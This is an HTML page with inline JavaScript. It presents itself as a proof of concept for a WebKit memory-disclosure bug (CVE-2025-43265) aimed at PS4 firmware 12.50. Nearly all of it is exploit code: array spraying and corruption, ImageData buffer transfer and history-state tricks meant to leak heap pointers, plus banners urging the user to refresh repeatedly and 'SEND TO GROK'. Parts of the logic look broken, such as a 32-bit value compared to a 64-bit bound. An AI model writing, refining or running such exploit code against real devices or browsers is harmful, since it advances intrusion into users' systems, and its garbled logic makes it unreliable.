<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebKit CVE-2025-43265 — FINAL LEAK HUNT (PS4 12.50)</title>
    <style>
        body { background: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', monospace; padding: 20px; line-height: 1.6; }
        h1 { border-bottom: 2px solid #da3633; padding-bottom: 10px; color: #ff5555; }
        .box { background: #161b22; border: 1px solid #30363d; padding: 15px; margin-bottom: 20px; border-radius: 6px; }
        .badge { display: inline-block; padding: 4px 10px; border-radius: 4px; font-weight: bold; }
        .secure { background: #238636; color: #fff; }
        .vulnerable { background: #da3633; color: #fff; }
        .partial { background: #d29922; color: #000; }
        button { cursor: pointer; padding: 12px 24px; background: #ff4444; color: #fff; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; }
        button:hover { background: #ff6666; }
        #console { font-family: 'Courier New', monospace; background:#000; color:#0f0; padding:15px; height:400px; overflow-y:scroll; border:1px solid #0f0; border-radius:6px; }
        .rainbow { color:#ff79c6; font-weight:bold; }
    </style>
</head>
<body>
    <h1>WebKit CVE-2025-43265 PoC: Internal State Disclosure (HexRabbit)</h1>
    <p>Jul 2025 Patch: Improved input validation (BZ 294182).<br>
    <span class="rainbow">FINAL LEAK HUNT — ONE POINTER AND WE WIN</span></p>
    <div class="box"><h3>Status</h3><div id="status">Waiting for heap leak...</div></div>
    <div class="box"><h3>Live Logs — COPY ANY LINE WITH 0x...</h3><div id="console"></div></div>
<script>
    const log = msg => {
        const c = document.getElementById('console');
        c.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
        c.scrollTop = c.scrollHeight;
    };
    const set = (t,c) => document.getElementById('status').textContent = t, document.getElementById('status').className='badge '+c;

    log("Starting FINAL LEAK HUNT — refresh 5-15 times");
    set("RUNNING...", "partial");

    // Same corruption you already hit
    const victim = [];
    for(let i=0;i<0x8000;i++) victim[i] = new Array(0x40).fill(1.1);
    const corrupt = (i,o) => { try{victim[i%0x8000][o]=1337.37;}catch(e){} };
    for(let i=0;i<1e7;i++) corrupt(i*i,0);
    for(let b=0;b<0x2000;b+=0x80) for(let o=0x40;o<0x200;o+=8) for(let j=0;j<0x80;j++) corrupt(b+j,o);

    // ImageData leak — maximum aggression
    const y = new ImageData(1, 0x8000);
    postMessage("", "*", [y.data.buffer]);
    const props = {};
    for(let i=0; i<0x8000/2; ) { props[i++] = {value:0x42424242}; props[i++] = {value:y}; }
    history.pushState(y,"");
    Object.defineProperties({}, props);
    const leak = new Uint32Array(history.state.data.buffer);

    setTimeout(() => {
        log("Scanning 32,768 leaked words — looking for heap pointers...");
        let found = 0;
        for(let i=0; i<leak.length; i+=2) {
            const low = leak[i];
            const high = leak[i+1];
            if(low !== 0x42424242 && high > 0x10000000 && high < 0xffffffffffff0000) {
                found++;
                log(`<<< LEAKED HEAP POINTER #${found}: 0x${high.toString(16).padStart(8,'0')}${low.toString(16).padStart(8,'0')} >>>`, true);
                if(found >= 1) {
                    set(`LEAKED ${found} POINTERS — SEND THIS LOG`, "vulnerable");
                    document.body.innerHTML = "<h1 style='color:#0f0;text-align:center;margin-top:40vh;font-size:4em;'>LEAK FOUND — SEND TO GROK</h1>";
                }
            }
        }
        if(found === 0) log("No leak this run — refresh (you WILL get one soon)");
    }, 3000);
</script>
</body>
</html>
